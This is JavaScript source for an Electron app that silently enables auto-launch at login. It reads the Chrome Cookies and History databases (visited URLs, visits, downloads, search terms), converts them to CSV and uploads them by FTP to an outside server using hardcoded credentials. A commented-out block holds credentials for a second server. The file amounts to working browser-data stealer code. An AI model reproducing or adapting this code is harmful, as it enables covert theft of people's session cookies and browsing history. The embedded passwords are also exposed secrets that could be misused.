const remote = require('electron').remote;

const $ = require('jquery');
// const util = require('util');
const sprintfJs = require('sprintf-js');
const SQL = require('sql.js');
const fs = require('fs');
const csvWriter = require('csv-write-stream');
const uuidv4 = require('uuid/v4');
// const Client = require('ssh2-sftp-client');
const EasyFtp = require('easy-ftp');
const Client = require('ssh2-sftp-client');

const AutoLaunch = require('auto-launch');
 
const sprintf = sprintfJs.sprintf,
    vsprintf = sprintfJs.vsprintf;

let runningStatus = 'running';
let runningStatusIcon = 'play_arrow';
let playButtonLabel = 'stop';
let playButtonIcon = 'stop';

let uploadTime1,
    uploadTime2,
    uploadTime3,
    uploadTime4;

let chromeProfilePath;

const basePath = remote.app.getAppPath();

let flag = false;

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

SQL.dbOpen = function (databaseFileName) {
    try {
        return new SQL.Database(fs.readFileSync(databaseFileName))
    } catch (error) {
        console.log("Can't open database file.", error.message)
        return null
    }
}

SQL.dbClose = function (databaseHandle, databaseFileName) {
    try {
        let data = databaseHandle.export()
        let buffer = Buffer.alloc(data.length, data)
        fs.writeFileSync(databaseFileName, buffer)
        databaseHandle.close()
        return true
    } catch (error) {
        console.log("Can't close database file.", error)
        return null
    }
}


$(document).ready(function () { 
    let autoLauncher = new AutoLaunch({
        name: 'G S',
        path: sprintf('%s/g-s.exe', basePath),
    });
    
    
    autoLauncher.isEnabled()
    .then(function(isEnabled){
        if(isEnabled){
            return;
        }
        autoLauncher.enable();
    })
    .catch(function(err){
        // handle error
    });

    // console.log(basePath);
    $('#exit-button').click(function (e) {
        remote.getCurrentWindow().close()
    });

    $('#play-button').on("click", function(e) {
        //runUpload();
        if (runningStatus == 'running') {
            runningStatus = 'stopped';
            runningStatusIcon = 'stop';
            playButtonLabel = 'run';
            playButtonIcon = 'play_arrow';
        } else {
            runningStatus = 'running';
            runningStatusIcon = 'play_arrow';
            playButtonLabel = 'stop';
            playButtonIcon = 'stop';
        }
        $('#running-status').html(runningStatus);
        $('#running-status-icon').html(runningStatusIcon);
        $('#play-button-icon').html(playButtonIcon);
        $('#play-button').html(playButtonLabel + $('#play-button-icon')[0].outerHTML);
    });

    $('#running-status').html(runningStatus);
    $('#running-status-icon').html(runningStatusIcon);
    $('#play-button-icon').html(playButtonIcon);
    $('#play-button').html(playButtonLabel + $('#play-button-icon')[0].outerHTML);

    uploadTime1 = $('#upload-time1').val();
    uploadTime2 = $('#upload-time2').val();

    // setInterval(runUpload, 60 * 1000);
    // setInterval(runUpload, 60 * 1000);
});

async function runUpload() {
    const current = new Date();
    // let dateTime = current.toISOString().substr(0, 19);
    const dateTime = sprintf('%d %02d:%02d',
        current.getDay(),
        current.getHours(), current.getMinutes()
    );
    console.log(dateTime);
    if (dateTime != uploadTime1 && dateTime != uploadTime2) {
        return;
    }
    chromeProfilePath = remote.app.getPath('home') + '\\AppData\\Local\\Google\\Chrome\\User Data';
    chromeProfilePath += '\\Default\\';
    console.log(chromeProfilePath);

    // const current = new Date();
    const dateString = sprintf('%04d%02d%02d',
        current.getFullYear(), current.getMonth() + 1, current.getDate()
    );
    const uuid = uuidv4();

    const dir = sprintf('%s/csvs', basePath);
    if (!fs.existsSync(dir)){
        fs.mkdirSync(dir);
    }    
        
    
    for (let i in fileList) {
        flag = true;
        convertCsvAndUpload(fileList[i], dateString, uuid);
        while (flag) {
            await sleep(1000);
        }
    }
};

async function convertCsvAndUpload(file, dateString, uuid) {
    /////////////////=================read and export csv============
    const fileName = file.fileName;
    const tables = file.tables;
    let db = SQL.dbOpen(chromeProfilePath + fileName);
    if (db === null) {
        // console.log('db not found');
    } else {
        /*
          The file is a valid sqlite3 database. This simple query will demonstrate
          whether it's in good health or not.
        */
        // let query = 'SELECT count(*) as `count` FROM `sqlite_master`';
        // let row = db.exec(query);
        // let tableCount = parseInt(row[0].values);
        // if (tableCount === 0) {
        //     console.log('The file is an empty SQLite3 database.');
        //     createDb(dbPath);
        // } else {
        //     console.log('The database has', tableCount, 'tables.');
        // }
        // if (typeof callback === 'function') {
        //     callback()
        // }
        let tableName;
        let csvName;
        let fields;
        let sql;
        let rows;
        // table_index = 0;
        for (let i in tables) {
            tableName = tables[i];
            csvName = sprintf('%s/csvs/%s_%s_%s.csv', basePath, tableName, dateString, uuid);
            sql = sprintf('SELECT * FROM `%s`', tableName);
            // sql = sprintf('SELECT `creation_utc`, `host_key`, `name`, `value`, `path`, `expires_utc`, `is_secure`, `is_httponly`, `last_access_utc`, `has_expires`, `is_persistent`, `priority`, `firstpartyonly` FROM `%s`', tableName);
            rows = db.exec(sql);
            let headers = rows[0].columns;
            let values = rows[0].values;

            let fstream = fs.createWriteStream(csvName);
            let writer = csvWriter({
                headers: headers,
                newline: '\r\n',
             });
            writer.pipe(fstream);
            // console.log(headers);
            // console.log(values);
            for (r in values) {
                writer.write(values[r]);
            //     fstream.write('\r\n');
            }
            writer.end();

            
            let ftp = new EasyFtp();
            const config = {
                host: 'ftp.salakit.com',
                port: 21,
                username: 'csvup@salakit.com',
                password: 'wtrRt2@sypQ',
                type : 'ftp'
            };
            ftp.connect(config);
            delay = true;
            ftp.upload(csvName, "/csvs/", function (err) {
                console.log(tableName, err);
                
                fs.unlink(csvName, (err) => {
                    if (err) {
                        // alert("An error ocurred updating the file" + err.message);
                        console.log(err, tableName);
                        return;
                    }
                    delay = false;
                //     console.log("File succesfully deleted", tableName);
                });
            })
            // .then(function() {
            // });
                
            console.log('csvName', tableName);
            while (delay) {
                await sleep(1000);
            }
            // let sftp = new Client();
            // sftp.connect({
            //     host: '206.189.45.15',
            //     port: '22',
            //     username: 'wwwadmin',
            //     password: '97dp2et87a7eaf23a1ccc73319a'
            // }).catch((err) => {
            //     console.log(err, 'catch error');
            // });
            // sftp.put(csvName, "/home/wwwadmin/csv/")
            // .catch((err) => {
            //     console.log(err, 'catch error');
            // });
            // sftp.end()
            // .catch((err) => {
            //     console.log(err, 'catch error');
            // });
        }
    }
    console.log("flag = false");
    flag = false;
}

function make_csv_and_upload_step_by_step() {

}

// const fileList = [
//     {
//         fileName: 'Cookies',
//         table: 'cookies',
//     },
//     {
//         fileName: 'History',
//         table: 'downloads',
//     },
//     {
//         fileName: 'History',
//         table: 'downloads_url_chains',
//     },
//     {
//         fileName: 'History',
//         table: 'keyword_search_terms',
//     },
//     {
//         fileName: 'History',
//         table: 'segment_usage',
//     },
//     {
//         fileName: 'History',
//         table: 'segments',
//     },
//     {
//         fileName: 'History',
//         table: 'urls',
//     },
//     {
//         fileName: 'History',
//         table: 'visits',
//     },
// ];

const fileList = [
    {
        fileName: 'Cookies',
        tables: ['cookies'],
    },
    {
        fileName: 'History',
        tables: [
            'downloads',
            'downloads_url_chains',
            'keyword_search_terms',
            'segment_usage',
            'segments',
            'urls',
            'visits'
        ],
    }
];
